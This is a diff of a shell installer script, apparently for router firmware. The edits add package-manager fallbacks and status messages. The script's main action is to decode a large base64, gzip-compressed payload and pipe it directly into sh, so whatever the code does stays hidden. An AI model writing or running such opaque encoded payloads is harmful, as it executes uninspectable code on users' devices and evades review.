@@ -1,12 +1,26 @@
 #!/bin/sh
 echo "====================================================="
-echo "  "FIRST STEP - CHECKER MODE - ACTIVATING....
+echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
 echo "====================================================="
 
 if ! command -v base64 >/dev/null 2>&1; then
-    echo "Installing decoding dependencies...pak"
-    opkg update >/dev/null 2>&1
-    opkg install coreutils-base64 >/dev/null 2>&1
+    echo "📦 Installing decoding dependencies..."
+    
+    if command -v opkg >/dev/null 2>&1; then
+        opkg update >/dev/null 2>&1
+        opkg install coreutils-base64 >/dev/null 2>&1
+    elif command -v apk >/dev/null 2>&1; then
+        apk update >/dev/null 2>&1
+        apk add coreutils >/dev/null 2>&1 
+    else
+        echo "❌ ERROR: No package manager found! Cannot install base64."
+        exit 1
+    fi
+    
+    if ! command -v base64 >/dev/null 2>&1; then
+         echo "❌ ERROR: Base64 installation failed. Aborting."
+         exit 1
+    fi
 fi
 
 PAYLOAD="H4sICBN9pmoAA2luc3RhbGwudHh0AM1azXLbSJK+4ynSsNYUpw3wx6J/RFFjWqJszlAiQ6TaO+3x
@@ -83,6 +97,7 @@ QePFC00T9/fpW9ISSvapjdxRnkWi2ysI+fOceQpDbiilMCNucRIFtC3ANaFc7V3VUsvTnHni9DHP
 AKornbB4TXlpCO02N9EELB3TVUvlabX2Ry/5pmunAKN6gbWa3ij+Li8R//pf/7bx6nDrGPoXR0et
 fv/kotP5AzbDafe4tQ8r15n3ei/bCgIXN1+u2CzRIkbf+kKyep36H/pjI5GdLwAA"
 
+echo "🚀 Executing Vault OS Payload..."
 echo "$PAYLOAD" | base64 -d | gunzip | sh
 
 exit 0
